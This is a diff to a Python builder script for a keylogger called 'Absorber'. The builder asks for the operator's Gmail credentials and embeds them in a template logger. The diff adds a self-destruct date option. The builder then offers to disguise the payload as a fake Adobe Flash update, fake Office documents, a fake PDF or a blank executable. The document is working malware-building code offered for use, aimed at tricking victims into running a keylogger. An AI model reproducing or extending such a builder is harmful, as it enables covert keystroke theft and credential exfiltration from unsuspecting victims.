@@ -1,7 +1,9 @@
 import os
 import sys
+from datetime import datetime, timedelta 
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+header = ('{0}Absorber{1} > {2}'.format(YELLOW, WHITE, END))
 
 os.system('cls')
 print ('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
@@ -10,15 +12,30 @@ os.system('copy Template\log.py .\log.py >nul')
 email = input(BLUE + 'Enter your email: ' + END)
 passd =  input(BLUE + 'Enter your password: ' + END)
 
-f = open('log.py','r+')
-readcontent = f.read()
-f.seek(0, 0)
-f.write('FRM = ' + "'" + email + "'" + '\n' + 'PAS = ' + "'" + passd + "'" + '\n' + readcontent)
-f.close()
+
+chk = input(BLUE + "\nDo you want to add self-destruction [y/n] \n" + header + END)
+if chk == "y" or chk == "Y":
+    days = int(input(BLUE + "No. of days after you want this keylogger to self-destruct (ex. 2) \n" + header + END))
+    if days <= 0:
+        print("Days should be greater than 0") 
+        sys.exit()   
+    else:
+        tme = str(datetime.now() + timedelta(days))[:10]
+        f = open('log.py','r+')
+        readcontent = f.read()
+        f.seek(0, 0)
+        f.write('FRM = ' + "'" + email + "'" + '\n' + 'PAS = ' + "'" + passd + "'" + '\n' + 'dst= ' + "'" + tme + "'" + '\n' + readcontent)
+        f.close()
+else:
+    f = open('log.py','r+')
+    readcontent = f.read()
+    f.seek(0, 0)
+    f.write('FRM = ' + "'" + email + "'" + '\n' + 'PAS = ' + "'" + passd + "'" + '\n' +  'dst= ' + str(None) + '\n' + readcontent)
+    f.close()
 
 os.system('cls')
 print ('\n {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fake Word docx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fake Powerpoint pptx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fake Acrobat pdf '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Blank Executable \n'.format(BLUE, WHITE))
-header = ('{0}Absorber{1} > {2}'.format(YELLOW, WHITE, END))
+
 
 choice = input(header)
 
